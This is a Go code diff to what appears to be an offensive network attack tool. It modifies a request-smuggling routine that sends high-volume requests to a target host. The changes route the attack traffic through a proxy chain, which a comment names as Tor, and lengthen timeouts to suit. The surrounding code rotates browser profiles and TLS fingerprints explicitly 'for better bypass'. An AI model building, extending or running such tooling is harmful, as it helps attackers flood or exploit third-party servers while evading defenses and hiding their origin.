@@ -73,7 +73,7 @@ func runRequestSmuggling(cfg *AttackConfig) {
 					return
 				}
 
-				err := smuggleRequest(host, port, hostHeader, path, useTLS, variant)
+			err := smuggleRequest(host, port, hostHeader, path, useTLS, variant, cfg.ProxyChain)
 				atomic.AddInt64(&metrics.TotalRequests, 1)
 				if err != nil {
 					atomic.AddInt64(&metrics.Failed, 1)
@@ -91,12 +91,22 @@ func runRequestSmuggling(cfg *AttackConfig) {
 	metricsMu.Unlock()
 }
 
-func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant int) error {
+func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant int, proxyChain string) error {
 	// Rotate browser profile for better bypass
 	profile := GetRandomProfile()
 	
-	dialer := &net.Dialer{Timeout: 6 * time.Second}
-	rawConn, err := dialer.Dial("tcp", host+":"+port)
+	// Use longer timeouts when routing through proxy chain (Tor adds latency)
+	dialTimeout := 6 * time.Second
+	tlsTimeout := 8 * time.Second
+	rwTimeout := 6 * time.Second
+	if proxyChain != "" || globalProxyChain != "" {
+		dialTimeout = 20 * time.Second
+		tlsTimeout = 25 * time.Second
+		rwTimeout = 20 * time.Second
+	}
+	
+	dial := createDialer(proxyChain, dialTimeout)
+	rawConn, err := dial("tcp", host+":"+port)
 	if err != nil {
 		return err
 	}
@@ -111,7 +121,7 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 		// Use browser-specific TLS fingerprint
 		tlsConfig := CreateTLSConfig(profile, hostHeader)
 		tlsConn := tls.Client(rawConn, tlsConfig)
-		tlsConn.SetDeadline(time.Now().Add(8 * time.Second))
+		tlsConn.SetDeadline(time.Now().Add(tlsTimeout))
 		if err := tlsConn.Handshake(); err != nil {
 			return err
 		}
@@ -119,7 +129,7 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 		defer tlsConn.Close()
 	}
 
-	conn.SetDeadline(time.Now().Add(6 * time.Second))
+	conn.SetDeadline(time.Now().Add(rwTimeout))
 
 	var req string
 	
@@ -218,7 +228,11 @@ func smuggleRequest(host, port, hostHeader, path string, useTLS bool, variant in
 
 	// Drain response
 	buf := make([]byte, 8192)
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	readTimeout := 3 * time.Second
+	if proxyChain != "" || globalProxyChain != "" {
+		readTimeout = 15 * time.Second
+	}
+	conn.SetReadDeadline(time.Now().Add(readTimeout))
 	conn.Read(buf)
 
 	return nil
